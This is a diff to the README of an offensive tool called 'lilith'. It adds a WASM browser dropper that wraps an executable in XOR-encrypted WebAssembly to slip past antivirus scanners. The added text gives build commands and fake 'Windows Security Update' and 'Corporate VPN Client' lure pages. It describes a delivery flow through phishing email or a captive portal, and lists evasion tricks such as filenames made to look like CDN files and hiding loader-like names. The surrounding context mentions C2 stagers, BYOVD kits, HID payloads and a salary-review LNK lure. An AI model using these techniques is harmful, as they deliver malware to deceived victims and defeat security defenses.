@@ -772,6 +772,11 @@ python3 lilith.py build --usb SharpUp --usb-device pico --usb-boot-delay 3000
 python3 lilith.py build --c2-stager --ble --ble-device bruce
 python3 lilith.py build --ble SharpUp --ble-device all
 
+# 6c. WASM browser dropper (browser-based delivery, AV evasion container)
+python3 lilith.py build --wasm --wasm-exe "SecurityUpdate.exe" --wasm-title "Windows Security Update"
+# → delivers install.html + runtime.<hex>.bin via lilith serve
+# → send URL to target: https://lhost:port/cdn/static/v3/install.html
+
 # 7. Start server (engagement DB auto-created at ~/.lilith/engagement.db)
 python3 lilith.py serve
 
@@ -864,6 +869,8 @@ All build output goes to `~/.lilith/` by default (or `$WORKSPACE/lilith/` if set
 | `byovd.exe` / `byovd.enc` | BYOVD kit (only if `--byovd` was run) |
 | `usb/` | USB HID payload files (only if `--usb` was run) |
 | `ble/` | BLE HID payload files (only if `--ble` was run) |
+| `<prefix>.<hex8>.bin` | WASM PE container (only if `--wasm` was run) |
+| `<name>.html` | WASM lure page (only if `--wasm` was run) |
 
 ---
 
@@ -914,6 +921,48 @@ Output:
 
 [*] When clicked, Explorer opens a search window showing 'Q2 2025 Salary Review'.
     One double-click fires the LNK payload.
+```
+
+### WASM browser dropper (`lilith build --wasm`)
+
+Wraps the compiled runner PE in a WebAssembly module for browser-based delivery. The `.wasm` file on disk and in transit contains only valid WebAssembly bytecode — no PE magic (`MZ`), no x64 opcodes, no shellcode byte patterns. AV scanners have significantly weaker WASM parsing compared to PE/shellcode heuristics.
+
+**Evasion layer:**
+- Payload bytes are XOR-encrypted inside the WASM data section with a per-build key independent from the runner XOR key
+- Decryption happens inside WASM linear memory — never visible to JS-level scanners
+- WASM binary filename randomised to CDN chunk pattern: `vendor.3a8f1c2b.bin`, `core.f7e21d9a.bin`
+- HTML filename is a generic portal name: `update.html`, `verify.html`, `setup.html`
+- No "wasm", "loader", or "payload" appears anywhere in the served paths
+
+```bash
+# Build runner first, then the WASM dropper
+python3 lilith.py build --runner
+python3 lilith.py build --wasm
+
+# Custom lure
+python3 lilith.py build --wasm \
+  --wasm-exe "CorporateVPN_v3.exe" \
+  --wasm-title "Corporate VPN Client"
+```
+
+Output:
+```
+[+] WASM container  : ~/.lilith/runtime.4b3a2c8f.bin  (83,920 bytes  key=0xD3)
+[+] Loader HTML     : ~/.lilith/install.html
+    Delivery URL    : https://10.10.14.1:8443/cdn/static/v3/install.html
+    Download name   : WindowsSecurityUpdate.exe
+```
+
+**Delivery:** send the URL via phishing email, chat message, or serve via `lilith network captive` / `wpad`. When the target visits the page, the browser fetches the `.wasm`, WASM decrypts the PE in linear memory, and a `<a download>` click is synthesised — the .exe lands in the downloads folder. Social engineering finishes the job.
+
+**Flow:**
+```
+Target browser → GET install.html
+                → GET runtime.4b3a2c8f.bin
+                     ↓ WebAssembly.instantiate(buf, {env: {exec: callback}})
+                     ↓ WASM run(): XOR-decrypts PE in linear memory
+                     ↓ calls exec(ptr=0, len=N)
+                → JS Blob URL → <a download="..."> → .exe in downloads folder
 ```
 
 ---
@@ -1127,6 +1176,7 @@ The watchdog immediately injects a backup agent. Expected behavior. Kill unwante
 - Persistence values stored as base64 `-enc` — no plaintext URLs or commands in registry/WMI at rest; payload fetches stager via SslStream (no WinHTTP COM, no COM activation event in telemetry)
 - Potato chain spawns `powershell.exe` directly — no `cmd.exe` intermediary
 - USB HID payloads contain no hardcoded URLs or tool names — stager URL is XOR-encoded in the keystroke payload
+- WASM dropper: payload bytes exist as WASM bytecode on disk (no PE magic, no x64 opcodes); decryption happens inside WASM linear memory; filenames randomised per build to CDN chunk pattern — no "wasm/loader/payload" in paths
 
 ---
 
